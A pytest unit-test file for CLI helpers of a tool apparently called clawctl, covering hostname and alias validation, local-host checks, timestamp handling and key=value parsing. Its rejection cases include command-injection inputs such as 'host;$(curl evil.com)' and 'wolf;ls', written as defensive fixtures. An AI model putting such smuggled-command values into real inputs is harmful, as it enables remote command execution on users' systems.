"""Unit tests for shared CLI helpers (ATX iter-1 W9, B10, S4)."""

from __future__ import annotations

from datetime import datetime, timedelta, timezone

import pytest
import typer

from clawrium.cli.clawctl._common import (
    is_local_host,
    now_seconds_since,
    parse_kv_labels,
    parse_kv_pairs,
    validate_alias,
    validate_hostname,
)


# ---- validate_hostname (B10) -----------------------------------------------


@pytest.mark.parametrize(
    "good",
    ["10.0.0.1", "wolf-i", "host01", "example.com", "kevin.local", "h", "::1"],
)
def test_validate_hostname_accepts(good: str) -> None:
    validate_hostname(good)


@pytest.mark.parametrize(
    "bad",
    [
        "",
        "host;$(curl evil.com)",
        "host with space",
        "-leading-dash",
        ".leading.dot",
        "h" * 254,  # > 253 chars total
        "host\nnewline",
        "host‮rlo",  # bidi override
        ("a" * 64) + ".com",  # ATX iter-2 W1 — DNS label too long
    ],
)
def test_validate_hostname_rejects(bad: str) -> None:
    with pytest.raises(typer.Exit):
        validate_hostname(bad)


def test_validate_hostname_max_label_accepts_63() -> None:
    """ATX iter-2 W1: exactly 63 chars per label is the RFC max."""
    validate_hostname(("a" * 63) + ".com")


# ---- validate_alias (W10) --------------------------------------------------


@pytest.mark.parametrize("good", ["wolfi", "wolf-i", "wolf_i", "a", "abc123"])
def test_validate_alias_accepts(good: str) -> None:
    validate_alias(good)


@pytest.mark.parametrize(
    "bad",
    [
        "",
        "wolf;ls",
        "wolf=bad",
        "wolf/slash",
        "wolf bad",
        "wolf‮rlo",
        "wolf!",
    ],
)
def test_validate_alias_rejects(bad: str) -> None:
    with pytest.raises(typer.Exit):
        validate_alias(bad)


# ---- is_local_host (S4) ----------------------------------------------------


@pytest.mark.parametrize("local", ["localhost", "127.0.0.1", "::1", "LocalHost"])
def test_is_local_host_true(local: str) -> None:
    assert is_local_host(local)


@pytest.mark.parametrize(
    "remote", ["0.0.0.0", "10.0.0.1", "example.com", "", None, "::2"]
)
def test_is_local_host_false(remote) -> None:
    assert not is_local_host(remote)


# ---- now_seconds_since (W9) ------------------------------------------------


def test_now_seconds_since_handles_none() -> None:
    assert now_seconds_since(None) == 0


def test_now_seconds_since_handles_empty() -> None:
    assert now_seconds_since("") == 0


def test_now_seconds_since_handles_bad_format() -> None:
    assert now_seconds_since("not-a-timestamp") == 0


def test_now_seconds_since_clamps_future() -> None:
    future = (datetime.now(timezone.utc) + timedelta(hours=1)).isoformat()
    assert now_seconds_since(future) == 0


def test_now_seconds_since_handles_z_suffix() -> None:
    past = (datetime.now(timezone.utc) - timedelta(seconds=30)).strftime(
        "%Y-%m-%dT%H:%M:%SZ"
    )
    elapsed = now_seconds_since(past)
    assert 25 <= elapsed <= 60  # allow slop for clock + test wallclock


# ---- parse_kv_labels --------------------------------------------------------


def test_parse_kv_labels_empty_returns_dict() -> None:
    assert parse_kv_labels(None) == {}
    assert parse_kv_labels([]) == {}


def test_parse_kv_labels_basic() -> None:
    assert parse_kv_labels(["env=prod", "role=web"]) == {"env": "prod", "role": "web"}


def test_parse_kv_labels_invalid_exits() -> None:
    with pytest.raises(typer.Exit):
        parse_kv_labels(["noequals"])


# ---- parse_kv_pairs --------------------------------------------------------


def test_parse_kv_pairs_set_and_delete() -> None:
    set_map, delete_keys = parse_kv_pairs(["env=prod", "role=web", "old-"])
    assert set_map == {"env": "prod", "role": "web"}
    assert delete_keys == ["old"]


def test_parse_kv_pairs_invalid_exits() -> None:
    with pytest.raises(typer.Exit):
        parse_kv_pairs(["bad"])
